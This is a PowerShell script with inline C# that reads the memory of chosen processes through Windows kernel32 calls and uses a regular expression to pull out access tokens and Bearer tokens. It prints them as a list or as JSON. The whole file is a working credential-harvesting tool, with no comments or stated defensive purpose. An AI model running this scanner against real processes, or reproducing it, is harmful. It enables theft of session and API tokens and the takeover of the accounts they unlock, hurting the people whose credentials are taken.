param([int[]]$PidList, [switch]$Json, [string]$Pattern = '(?:accessToken\\?"\s*[:=]\s*\\?"|access_token\\?"\s*[:=]\s*\\?"|Bearer )([A-Za-z0-9_\-]{20,80})')

$src = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public class MemScan {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr read);
    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, IntPtr len);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    public static List<string> Scan(int pid, string pattern, int maxRegionMB = 128) {
        var results = new List<string>();
        IntPtr h = OpenProcess(0x0010 | 0x0400, false, pid);
        if (h == IntPtr.Zero) return results;
        try {
            var rx = new Regex(pattern, RegexOptions.Compiled);
            long addr = 0;
            MEMORY_BASIC_INFORMATION mbi;
            var buf = new byte[4 * 1024 * 1024];
            while (addr < 0x7FFFFFFFFFFF) {
                int r = VirtualQueryEx(h, (IntPtr)addr, out mbi, (IntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                if (r == 0) break;
                long size = (long)mbi.RegionSize;
                long baseAddr = (long)mbi.BaseAddress;
                if (mbi.State == 0x1000 && (mbi.Protect == 0x04 || mbi.Protect == 0x02 || mbi.Protect == 0x20 || mbi.Protect == 0x40 || mbi.Protect == 0x08)) {
                    if (size <= (long)maxRegionMB * 1024 * 1024 && size > 0) {
                        long offset = 0;
                        while (offset < size) {
                            int chunk = (int)Math.Min(buf.Length, size - offset);
                            IntPtr read;
                            if (ReadProcessMemory(h, (IntPtr)(baseAddr + offset), buf, (IntPtr)chunk, out read)) {
                                string s = Encoding.GetEncoding(28591).GetString(buf, 0, chunk);
                                foreach (Match m in rx.Matches(s)) {
                                    results.Add(m.Groups[1].Value);
                                    if (results.Count > 4000) return results;
                                }
                            }
                            offset += chunk;
                        }
                    }
                }
                addr = baseAddr + size;
                if (size == 0) break;
            }
        } finally { CloseHandle(h); }
        return results;
    }
}
'@

if (-not ("MemScan" -as [type])) { Add-Type -TypeDefinition $src -Language CSharp }

$all = New-Object System.Collections.Generic.List[string]
foreach ($p in $PidList) {
    try {
        foreach ($x in [MemScan]::Scan($p, $Pattern)) { if (-not $all.Contains($x)) { $all.Add($x) } }
    } catch { }
}
if ($Json) { ,@($all) | ConvertTo-Json -Compress } else { $all }
